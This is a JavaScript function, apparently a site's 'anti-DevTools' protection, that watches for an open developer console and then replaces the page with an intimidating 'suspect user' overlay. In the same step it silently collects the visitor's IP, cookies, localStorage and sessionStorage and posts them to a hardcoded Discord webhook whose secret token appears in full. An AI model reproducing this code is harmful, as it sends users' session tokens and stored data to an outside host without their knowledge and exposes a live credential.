export function Secure_F127() {
  const isAdmin = () => localStorage.getItem('EnesCDE_ADM:F12') === 'ADMIN';
  if (isAdmin()) {
    console.log('[E-CDE] Admin détecté, détection DevTools désactivée.');
    return;
  }

  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1220142285795098747/TX-3XrNfV_xZxhSpzX8WdJyKcuofwEeqzB5HIgFJ-zTLM-SdcFVGv3s4oXerGmSigoAc';
  const THRESHOLD = 160;
  const MAX_ATTEMPTS = 3;
  const STORAGE_KEY = 'E_CDE_DEVTOOL_DETECT';
  const REPORTED_KEY = 'E_CDE_REPORTED';

  const encode = s => btoa(unescape(encodeURIComponent(s)));
  const decode = s => decodeURIComponent(escape(atob(s)));

  function getCount() {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return 0;
    try { return parseInt(decode(raw), 10) || 0; }
    catch { return 0; }
  }

  function bumpCount() {
    const c = getCount() + 1;
    localStorage.setItem(STORAGE_KEY, encode(c.toString()));
    return c;
  }

  async function collectInfo() {
    let ip = 'unknown';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      ip = (await res.json()).ip;
    } catch (_) {}
    return {
      timestamp: new Date().toISOString(),
      ip,
      userAgent: navigator.userAgent,
      localStorage: { ...localStorage },
      sessionStorage: { ...sessionStorage },
      cookies: document.cookie,
    };
  }

  async function reportToDiscord(data) {
    if (localStorage.getItem(REPORTED_KEY) === '1') return;

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: '🚨 Détection DevTools suspecte',
          color: 0xff0000,
          fields: Object.entries(data).map(([k, v]) => ({
            name: k,
            value: typeof v === 'object'
              ? '```json\n' + JSON.stringify(v, null, 2).slice(0, 1000) + '\n```'
              : '```\n' + String(v).slice(0, 1000) + '\n```',
          })),
        }],
      }),
    });

    localStorage.setItem(REPORTED_KEY, '1');
  }

  function showHardCheck() {
    document.body.innerHTML = '';
    const overlay = document.createElement('div');
    overlay.style = `
      position:fixed;top:0;left:0;width:100vw;height:100vh;
      background:black;color:white;font-family:sans-serif;
      display:flex;align-items:center;justify-content:center;flex-direction:column;
      z-index:999999;
    `;
    const title = document.createElement('h1');
    title.innerHTML = 'Enes <span style="color:#00aaff">CDE</span>';
    title.style.marginBottom = '1em';
    const msg = document.createElement('div');
    msg.style = 'background:yellow;color:black;padding:20px;font-size:1.2em;max-width:90%;text-align:left;';
    msg.innerHTML = `
      Utilisateur suspect détecté.<br>
      Rapport envoyé à E‑CDE DB SC.<br>
      Vérification en cours : <span id="step">0</span>/30
    `;
    overlay.append(title, msg);
    document.body.appendChild(overlay);

    let step = 0;
    const interval = setInterval(() => {
      step++;
      overlay.querySelector('#step').textContent = step;
      if (step >= 30) clearInterval(interval);
    }, 500);
    incrementSuspicion();
  }

  function incrementSuspicion() {
    const key = 'EnesCDe_NOBSUS';
    const banKey = 'ECDE:ID';
    let count = parseInt(localStorage.getItem(key), 10);
    if (isNaN(count)) count = 0;
    count++;
    localStorage.setItem(key, count.toString());
    if (count >= 10) {
      localStorage.setItem(banKey, 'gn01:e0B:14q:8d80:e5a1:32e2:33ac:adad');
    }
  }

  // Boucle de détection DevTools
  setInterval(async () => {
    const iw = window.innerWidth, ih = window.innerHeight;
    const ow = window.outerWidth, oh = window.outerHeight;
    const diff = Math.abs(ow - iw) + Math.abs(oh - ih);

    if (diff > THRESHOLD) {
      const attempts = bumpCount();
      console.warn(`[E-CDE] DevTools trigger #${attempts}`);

      if (attempts >= MAX_ATTEMPTS) {
        showHardCheck();
        const info = await collectInfo();
        await reportToDiscord(info);
      }
    }
  }, 2000);
}
